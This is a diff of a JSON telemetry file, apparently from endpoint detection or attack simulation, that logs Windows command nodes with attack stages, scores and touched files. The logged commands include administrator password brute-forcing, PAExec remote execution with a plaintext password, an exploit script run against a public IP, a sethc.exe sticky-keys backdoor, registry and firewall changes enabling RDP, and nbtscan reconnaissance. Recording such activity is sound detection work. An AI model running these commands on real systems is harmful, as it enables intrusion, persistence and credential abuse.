+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/QMZSXEFE9Y03YZX3I7J9.temp\\\"\""
+            ]
         },
         {
-            "label": "/c del /f /q PhpStudyExp2.py",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "72a13f545e5dfb5835365609045201a0",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  echo start:dbb2f234-101f-4f44-bb97-72263635f506",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "79e647173fa9f90a3d1824085ed54209",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\"",
+                "  C:/Users/Public/sangforcat1.exe.Manifest\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/PVTBUC15U6707GF221JD.temp\\\"\""
+            ]
         },
         {
-            "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
-            "stage": "null",
-            "raw_cmd": "conhost",
-            "id": "7d93ed06ebe62165a53946755b296419",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c del /f /q nbtscan.exe",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "7fae21d89b5e159cb4fb979bae23e5f7",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c del /f /q PAExec.exe",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "84d0532fea30425eefa218baae1e0e8c",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "/c WinBrute.exe administrator_pass.txt administrator",
             "stage": "null",
             "raw_cmd": "cmd",
             "id": "9aee6c9fc4f7c217da01b791e7079abb",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/WinBrute.exe\\\"\""
+            ]
         },
         {
-            "label": "/c echo start:5a860809-a5ba-4924-8c54-065a8650bdc9",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "9cd2d35432282fabcf51c2d73e21ed8b",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  echo start:b7f92752-df34-4b08-9e98-45a3004b94ff",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "a5c0daa1992383a1b51018d3a0731f46",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/9VFIP860CKE1LHLIBMFO.temp\\\"\""
+            ]
         },
         {
-            "label": "/c echo start:e3c59524-1c33-40e6-99c4-a2d8329d047f",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "b3f928c1b1e9d5436163d15dea380b93",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c echo end:e3c59524-1c33-40e6-99c4-a2d8329d047f",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "b852f346dcf6e1285810808d7a3428bd",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c del /f /q PAExec.exe",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "bb0628124210cb446ee755aa3ecb71ff",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1/ &apos;",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "c21e17ba94c56d084eca6701a20c1aed",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/TXJZ0MQULVJIM968YX3K.temp\\\"\""
+            ]
         },
         {
-            "label": "/c echo end:60039041-7450-46ab-99f6-126b30b91407",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "cdb69fb50fe0c7151e97fed988136f74",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c echo end:e96998eb-ab9a-4a48-979c-fb68511a6a83",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "d7b56b6fd0eb9b1d4dc62ef6993fdaf1",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "/c PAExec.exe //192.168.0.95 -u administrator -p Data123456! ipconfig",
             "stage": "null",
             "raw_cmd": "cmd",
             "id": "e30a6deee197fdac89189022341f49c7",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/PAExec.exe\\\"\""
+            ]
         },
         {
-            "label": "/c echo end:5a860809-a5ba-4924-8c54-065a8650bdc9",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "e8874be025529d42da8b5a5a189178fa",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c del /f /q PhpStudyExp2.py",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "ef5796fb4e863cfdae647ff52b1cdd5e",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c echo start:60039041-7450-46ab-99f6-126b30b91407",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "f2f1cb87733bc78e068183316fe3ee21",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  echo end:dbb2f234-101f-4f44-bb97-72263635f506",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "f5c0147f949c803297be02b4a0ae98f2",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/ZJOHMNEXZVSFTFQ9N3LM.temp\\\"\""
+            ]
         },
         {
-            "label": "C:/Windows/system32/reg.exe   query  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe",
-            "stage": "null",
-            "raw_cmd": "reg",
-            "id": "418af2182596f7b2499803e884692c11",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "C:/Windows/system32/reg.exe   query  HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server",
-            "stage": "null",
-            "raw_cmd": "reg",
-            "id": "49e0b760ea287f477dacaf3c04ebb258",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "C:/Windows/system32/reg.exe   add  HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server  /v fDenyTSConnections /t REG_DWORD /d 0 /f",
-            "stage": "null",
-            "raw_cmd": "reg",
-            "id": "76ae200b0a1a73aecf7a293da7f3552c",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "C:/Windows/system32/reg.exe   ADD  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe  /v Debugger /t REG_SZ /d C:/windows/system32/cmd.exe /f",
-            "stage": "null",
-            "raw_cmd": "reg",
-            "id": "a6fc5bd669ef2dd46773e348aaa823de",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "C:/Windows/system32/netsh.exe   advfirewall firewall add rule  name=Remote Desktop  dir=in action=allow protocol=TCP localport=3389",
-            "stage": "null",
-            "raw_cmd": "netsh",
-            "id": "d37af5adfaa024e539b83e30191fcdec",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "\"nbtscan.exe  192.168.0.244/24\"",
+            "description": "null",
+            "label": "nbtscan.exe  192.168.0.244/24",
             "stage": "Internal Reconnaissance",
+            "raw_cmd": "nbtscan",
             "id": "53b7fcdc4bd446a42e1f7b68b0a70626",
             "score": "13.2",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/nbtscan.exe\\\"\""
+            ]
         },
         {
-            "label": "C:/Windows/system32/reg.exe   ADD  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe  /v Debugger /t REG_SZ /d C:/windows/system32/sethc.exe /f",
-            "stage": "null",
-            "raw_cmd": "reg",
-            "id": "2d4de7fc672e75dcafc44eddc3ba0ea8",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "C:/Windows/system32/reg.exe   query  HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe",
-            "stage": "null",
-            "raw_cmd": "reg",
